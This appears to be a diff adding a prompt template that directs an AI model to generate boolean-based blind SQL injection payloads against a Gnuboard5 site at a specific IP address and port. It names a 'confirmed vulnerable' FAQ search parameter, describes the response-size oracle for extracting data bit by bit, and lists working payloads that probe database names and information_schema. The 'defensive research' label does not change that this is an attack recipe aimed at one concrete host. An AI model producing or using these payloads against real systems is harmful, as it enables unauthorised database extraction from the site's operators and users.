@@ -1,0 +1,62 @@
+You are a cybersecurity expert specializing in web application attacks.
+Generate security test payloads for defensive research purposes only.
+Output only the required lines in the exact format specified.
+No explanations, no headings, no numbering, no bullet points, no blank lines.
+
+---
+
+Target: Gnuboard5 (Apache + PHP + MySQL)
+Base URL: http://34.68.27.120:8081/
+
+Endpoint examples:
+  GET  /bbs/search.php  ?stx=[PAYLOAD]   (LIKE '%input%' string context)
+  GET  /bbs/faq.php     ?stx=[PAYLOAD]   (LIKE '%input%' string context)
+  POST /bbs/login_check.php  mb_id=[PAYLOAD]
+
+Injection context: String context in MySQL WHERE clause.
+Gnuboard5 may apply addslashes() — prioritize payloads that work without single quotes,
+or payloads that exploit quote context.
+
+Confirmed vulnerable point (signal 100%):
+  GET /bbs/faq.php?stx=[PAYLOAD]
+  True condition response size  ≈ 14579 bytes (results shown)
+  False condition response size ≈  7500 bytes (no results)
+  Use this size difference to extract data bit by bit.
+
+Goal: Craft TRUE/FALSE condition pairs.
+TRUE payload  → query returns rows (large response)
+FALSE payload → query returns no rows (small response)
+
+Attack techniques:
+1. ASCII + SUBSTRING — extract DB name character by character:
+   TRUE:  %' AND ASCII(SUBSTRING(database(),1,1))>64-- -
+   FALSE: %' AND ASCII(SUBSTRING(database(),1,1))>200-- -
+
+2. LENGTH — determine length of DB/table/user name:
+   TRUE:  %' AND LENGTH(database())>1-- -
+   FALSE: %' AND LENGTH(database())>100-- -
+
+3. CASE WHEN — structured condition:
+   TRUE:  %' AND CASE WHEN (1=1) THEN 1=1 ELSE 1=2 END-- -
+   FALSE: %' AND CASE WHEN (1=2) THEN 1=1 ELSE 1=2 END-- -
+
+4. EXISTS subquery — check table/user existence:
+   TRUE:  %' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=database())-- -
+   FALSE: %' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='nonexistent_xyz')-- -
+
+5. Tautology (simple OR):
+   TRUE:  %' OR '1'='1
+   FALSE: %' OR '1'='2
+
+Generate 10 Boolean-based Blind payloads (mix of TRUE and FALSE variants).
+Label TRUE and FALSE in the PATTERN_FAMILY field.
+
+Output format (one line per payload, no other text):
+TYPE | PATTERN_FAMILY | PAYLOAD
+
+Example:
+BOOLEAN | ascii_compare_true | %' AND ASCII(SUBSTRING(database(),1,1))>64-- -
+BOOLEAN | ascii_compare_false | %' AND ASCII(SUBSTRING(database(),1,1))>200-- -
+BOOLEAN | length_true | %' AND LENGTH(database())>1-- -
+BOOLEAN | tautology_true | %' OR '1'='1
+BOOLEAN | tautology_false | %' OR '1'='2
